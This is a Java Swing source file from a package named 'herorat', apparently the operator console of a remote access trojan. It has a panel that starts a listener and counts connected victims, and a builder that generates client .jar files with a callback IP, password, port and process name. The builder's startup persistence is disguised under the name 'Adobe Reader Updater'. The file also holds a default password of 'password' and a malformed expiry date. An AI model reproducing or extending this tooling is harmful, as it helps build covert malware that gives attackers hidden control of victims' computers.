package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.ComponentOrientation;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingConstants;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import net.herorat.Main;
import net.herorat.database.DBNew;
import net.herorat.features.create.Create;
import net.herorat.network.Network;

public class ServerStatusPanel extends JPanel {
	public static boolean ONLINE = true;
	public static boolean OFFLINE = false;
	
	private JButton clientCreateButton;
	private JCheckBox saveSettings_save;
	private JFileChooser chooser_save;
	private JPanel statsContainer;
	private JPanel connectionContainer;
	private JPanel newServContainer;
	private JPasswordField pwdPassword;
	private JCheckBox rememberSettingChBx;
	private JSpinner hostPortNumber;
	private JSpinner port_save;
	private JButton startServerButton;
	private JButton stopServerButton;
	private JTextField ip_save;
	private JPasswordField password_save;
	private JTextField filepath_save;
	private JTextField process_name;
	private JLabel expirationDate;
	private JLabel statusLabel;
	private JLabel statusText;
	

	JLabel totalServerCount;
	JLabel offlineServerCount;
	
	private JLabel onlineServerCount;
	
	public ServerStatusPanel(){
		setBackground(Color.WHITE);
		setForeground(Color.BLACK);
		setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));
		init();
		build();
	}
	
	void build(){
		add(statsContainer);
		add(connectionContainer);
		add(newServContainer);
	}
	
	void init(){
		initStatsContainer();
		initConnectionContainer();
		initNewServContainer();
	}
	
	public void setOnlineClients(String count){
		onlineServerCount.setText(count);
	}
	
	public void setOfflineClients(String count){
		offlineServerCount.setText(count);
	}
	
	public void setTotalClients(String count){
		totalServerCount.setText(count);
	}
	
	public void setServerStatus(boolean on){
		if(on){
			statusLabel.setForeground(Color.GREEN);
			statusText.setText("Online");
			statusText.setForeground(Color.GREEN);
		}else{
			statusLabel.setForeground(Color.RED);
			statusText.setText("Offline");
			statusText.setForeground(Color.RED);
		}
	}
	
	public void setExpirationDate(String date){
		expirationDate.setText(date);
	}
	
	void initStatsContainer(){
		statsContainer = new JPanel();
		statsContainer.setMaximumSize(new Dimension(200, 160));
		statsContainer.setMinimumSize(new Dimension(200, 140));
		statsContainer.setRequestFocusEnabled(false);
		statsContainer.setFocusable(false);
		statsContainer.setPreferredSize(new Dimension(200, 140));
		statsContainer.setBackground(Color.WHITE);
		statsContainer.setBorder(new TitledBorder(null, "Stats", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 0, 0)));
		
		statsContainer.setLayout(new GridLayout(0, 2, 0, 0));
		
		statusLabel = new JLabel("Status: ");
		statusLabel.setFont(new Font("Tahoma", Font.BOLD, 11));
		statusLabel.setForeground(Color.RED);
		statusLabel.setIconTextGap(0);
		statusLabel.setFocusable(false);
		statusLabel.setBorder(null);
		statusLabel.setAlignmentX(0.5f);
		statusLabel.setHorizontalAlignment(SwingConstants.RIGHT);
		statusLabel.setHorizontalTextPosition(SwingConstants.LEFT);
		statusLabel.setPreferredSize(new Dimension(0, 0));
		statusLabel.setMaximumSize(new Dimension(1080, 2000));
		statusLabel.setMinimumSize(new Dimension(0, 0));
		statsContainer.add(statusLabel);
		
		statusText = new JLabel("Offline");
		statusText.setFont(new Font("Tahoma", Font.BOLD, 11));
		statusText.setForeground(Color.RED);
		statusText.setIconTextGap(0);
		statusText.setFocusable(false);
		statusText.setBorder(null);
		statusText.setAlignmentX(0.5f);
		statsContainer.add(statusText);
		
		JLabel lblNewLabel_2 = new JLabel("Online servers: ");
		lblNewLabel_2.setFont(new Font("Tahoma", Font.BOLD, 11));
		lblNewLabel_2.setIconTextGap(0);
		lblNewLabel_2.setFocusable(false);
		lblNewLabel_2.setBorder(null);
		lblNewLabel_2.setAlignmentX(0.5f);
		lblNewLabel_2.setHorizontalAlignment(SwingConstants.RIGHT);
		lblNewLabel_2.setHorizontalTextPosition(SwingConstants.LEFT);
		lblNewLabel_2.setPreferredSize(new Dimension(0, 0));
		lblNewLabel_2.setMaximumSize(new Dimension(1080, 2000));
		lblNewLabel_2.setMinimumSize(new Dimension(0, 0));
		statsContainer.add(lblNewLabel_2);
		
		onlineServerCount = new JLabel("0");
		onlineServerCount.setFont(new Font("Tahoma", Font.BOLD, 11));
		onlineServerCount.setIconTextGap(0);
		onlineServerCount.setFocusable(false);
		onlineServerCount.setBorder(null);
		onlineServerCount.setAlignmentX(0.5f);
		statsContainer.add(onlineServerCount);
		
		JLabel lblNewLabel_3 = new JLabel("Offline Servers: ");
		lblNewLabel_3.setFont(new Font("Tahoma", Font.BOLD, 11));
		lblNewLabel_3.setIconTextGap(0);
		lblNewLabel_3.setFocusable(false);
		lblNewLabel_3.setBorder(null);
		lblNewLabel_3.setAlignmentX(0.5f);
		lblNewLabel_3.setHorizontalAlignment(SwingConstants.RIGHT);
		lblNewLabel_3.setHorizontalTextPosition(SwingConstants.LEFT);
		lblNewLabel_3.setPreferredSize(new Dimension(0, 0));
		lblNewLabel_3.setMaximumSize(new Dimension(1080, 2000));
		lblNewLabel_3.setMinimumSize(new Dimension(0, 0));
		statsContainer.add(lblNewLabel_3);
		
		offlineServerCount = new JLabel("0");
		offlineServerCount.setFont(new Font("Tahoma", Font.BOLD, 11));
		offlineServerCount.setIconTextGap(0);
		offlineServerCount.setFocusable(false);
		offlineServerCount.setBorder(null);
		offlineServerCount.setAlignmentX(0.5f);
		statsContainer.add(offlineServerCount);
		
		JLabel lblNewLabel_4 = new JLabel("Total Servers: ");
		lblNewLabel_4.setFont(new Font("Tahoma", Font.BOLD, 11));
		lblNewLabel_4.setIconTextGap(0);
		lblNewLabel_4.setFocusable(false);
		lblNewLabel_4.setBorder(null);
		lblNewLabel_4.setAlignmentX(0.5f);
		lblNewLabel_4.setHorizontalAlignment(SwingConstants.RIGHT);
		lblNewLabel_4.setHorizontalTextPosition(SwingConstants.LEFT);
		lblNewLabel_4.setPreferredSize(new Dimension(0, 0));
		lblNewLabel_4.setMaximumSize(new Dimension(1080, 2000));
		lblNewLabel_4.setMinimumSize(new Dimension(0, 0));
		statsContainer.add(lblNewLabel_4);
		
		totalServerCount = new JLabel("0");
		totalServerCount.setFont(new Font("Tahoma", Font.BOLD, 11));
		totalServerCount.setIconTextGap(0);
		totalServerCount.setFocusable(false);
		totalServerCount.setBorder(null);
		totalServerCount.setAlignmentX(0.5f);
		statsContainer.add(totalServerCount);
		
		
		expirationDate = new JLabel("Expiration Date: ");
		expirationDate.setFont(new Font("Tahoma", Font.PLAIN, 10));
		expirationDate.setIconTextGap(0);
		expirationDate.setFocusable(false);
		expirationDate.setBorder(null);
		expirationDate.setAlignmentX(0.5f);
		expirationDate.setHorizontalAlignment(SwingConstants.RIGHT);
		expirationDate.setHorizontalTextPosition(SwingConstants.LEFT);
		expirationDate.setPreferredSize(new Dimension(0, 0));
		expirationDate.setMaximumSize(new Dimension(1080, 2000));
		expirationDate.setMinimumSize(new Dimension(0, 0));
		statsContainer.add(expirationDate);
		
		JLabel lblNewLabel_10 = new JLabel("20/070/2016");
		lblNewLabel_10.setFont(new Font("Tahoma", Font.PLAIN, 10));
		lblNewLabel_10.setIconTextGap(0);
		lblNewLabel_10.setFocusable(false);
		lblNewLabel_10.setBorder(null);
		lblNewLabel_10.setAlignmentX(0.5f);
		statsContainer.add(lblNewLabel_10);
	}
	
	void initConnectionContainer(){
		connectionContainer = new JPanel();
		connectionContainer.setPreferredSize(new Dimension(200, 130));
		connectionContainer.setMaximumSize(new Dimension(200, 130));
		connectionContainer.setMinimumSize(new Dimension(200, 130));
		connectionContainer.setBackground(Color.WHITE);
		connectionContainer.setBorder(new TitledBorder(null, "Server Settings", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		
		connectionContainer.setLayout(new BorderLayout(0, 0));
		
		JPanel panel = new JPanel();
		panel.setPreferredSize(new Dimension(200, 150));
		panel.setMinimumSize(new Dimension(200, 150));
		panel.setMaximumSize(new Dimension(200, 150));
		panel.setBackground(Color.WHITE);
		connectionContainer.add(panel);
		panel.setLayout(new GridLayout(4, 2, 0, 0));
		
		JLabel lblNewLabel_12 = new JLabel("Password: ");
		panel.add(lblNewLabel_12);
		
		pwdPassword = new JPasswordField();
		pwdPassword.setText("password");
		lblNewLabel_12.setLabelFor(pwdPassword);
		panel.add(pwdPassword);
		
		JLabel lblNewLabel_11 = new JLabel("New label");
		panel.add(lblNewLabel_11);
		
		hostPortNumber = new JSpinner();
		hostPortNumber.setModel(new SpinnerNumberModel(25565, 1024, 65535, 1));
		panel.add(hostPortNumber);
		
		JLabel lblNewLabel_19 = new JLabel("");
		lblNewLabel_19.setEnabled(false);
		panel.add(lblNewLabel_19);
		
		rememberSettingChBx = new JCheckBox("Save Config");
		rememberSettingChBx.setBackground(Color.WHITE);
		rememberSettingChBx.setActionCommand("Save config");
		panel.add(rememberSettingChBx);
		
		startServerButton = new JButton("Start");
		startServerButton.setFocusable(false);
		startServerButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				if (rememberSettingChBx.isSelected())
				{
					DBNew.saveConnect(new String(pwdPassword.getPassword()), hostPortNumber.getValue().toString());
				}
				
				pwdPassword.setEnabled(false);
				hostPortNumber.setEnabled(false);
				startServerButton.setEnabled(false);
				stopServerButton.setEnabled(true);
				
				setServerStatus(ServerStatusPanel.ONLINE);
				
				Main.network = new Network(Integer.parseInt(hostPortNumber.getValue().toString()), new String(pwdPassword.getPassword()));
				Main.network.start();
			}
		});
		panel.add(startServerButton);
		
		stopServerButton = new JButton("Stop");
		stopServerButton.setFocusable(false);
		stopServerButton.setEnabled(false);
		stopServerButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				Main.network.disconnect();
			
				pwdPassword.setEnabled(true);
				hostPortNumber.setEnabled(true);
				stopServerButton.setEnabled(false);
				startServerButton.setEnabled(true);
				
				setServerStatus(ServerStatusPanel.OFFLINE);
			}
		});
		panel.add(stopServerButton);
	}
	
	void initNewServContainer(){
		newServContainer = new JPanel();
		newServContainer.setMaximumSize(new Dimension(200, 2000));
		newServContainer.setMinimumSize(new Dimension(200, 200));
		newServContainer.setPreferredSize(new Dimension(200, 200));
		newServContainer.setBackground(Color.WHITE);
		newServContainer.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Create New Client", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 0, 0)));
		newServContainer.setLayout(new BorderLayout(0, 0));
		
		JPanel panel_2 = new JPanel();
		panel_2.setMinimumSize(new Dimension(166, 160));
		panel_2.setComponentOrientation(ComponentOrientation.LEFT_TO_RIGHT);
		panel_2.setBackground(Color.WHITE);
		panel_2.setPreferredSize(new Dimension(166, 160));
		newServContainer.add(panel_2, BorderLayout.CENTER);
		panel_2.setLayout(new GridLayout(0, 2, 0, 0));
		
		JLabel lblNewLabel_13 = new JLabel("IP/DNS:");
		panel_2.add(lblNewLabel_13);
		
		ip_save = new JTextField();
		panel_2.add(ip_save);
		ip_save.setColumns(10);
		
		JLabel lblNewLabel_14 = new JLabel("Password:");
		panel_2.add(lblNewLabel_14);
		
		password_save = new JPasswordField();
		panel_2.add(password_save);
		password_save.setColumns(10);
		
		JLabel lblNewLabel_15 = new JLabel("Port:");
		panel_2.add(lblNewLabel_15);
		
		port_save = new JSpinner();
		port_save.setModel(new SpinnerNumberModel(25565, 1024, 65535, 1));
		panel_2.add(port_save);
		
		JLabel lblNewLabel_16 = new JLabel("Save Directory:");
		panel_2.add(lblNewLabel_16);
		
		filepath_save = new JTextField();
		panel_2.add(filepath_save);
		filepath_save.setColumns(10);
		
		JLabel label = new JLabel("");
		label.setEnabled(false);
		panel_2.add(label);
		
		JButton btnNewButton_2 = new JButton("Browse...");
		btnNewButton_2.setFocusable(false);
		chooser_save = new JFileChooser();
		btnNewButton_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				if (chooser_save.showSaveDialog(null) == 0)
				{
					String save_path = chooser_save.getSelectedFile().getAbsolutePath();
					if (!save_path.endsWith(".jar"))
					{
						if (save_path.lastIndexOf(".") > 0)
						{
							save_path = save_path.substring(0, save_path.lastIndexOf(".")) + ".jar";
						}
						else
						{
							save_path += ".jar";
						}
					}
					filepath_save.setText(save_path);
				}
			}
		});
		panel_2.add(btnNewButton_2);
		
		JLabel lblNewLabel_18 = new JLabel("Launch at startup");
		panel_2.add(lblNewLabel_18);
		
		saveSettings_save = new JCheckBox("");
		saveSettings_save.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent evt)
			{
				if (saveSettings_save.isSelected())
				{
					saveSettings_save.setEnabled(true);
					saveSettings_save.setText("Adobe Reader Updater");
				}
				else
				{
					saveSettings_save.setEnabled(false);
					saveSettings_save.setText("");
				}
			}
		});
		panel_2.add(saveSettings_save);
		saveSettings_save.setBackground(Color.WHITE);
		
		JLabel lblNewLabel_17 = new JLabel("Process Name:");
		panel_2.add(lblNewLabel_17);
		
		process_name = new JTextField();
		panel_2.add(process_name);
		process_name.setColumns(10);
		
		clientCreateButton = new JButton("Create Client");
		clientCreateButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				if (new String(password_save.getPassword()).equals(""))
				{
					JOptionPane.showMessageDialog(null, "You must specify a password to generate a new server.", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				Create.create(ip_save.getText(), new String(password_save.getPassword()), Integer.parseInt(port_save.getValue().toString()), filepath_save.getText(), process_name.getText());
			}
		});
		clientCreateButton.setFocusable(false);
		newServContainer.add(clientCreateButton, BorderLayout.SOUTH);
	}
}
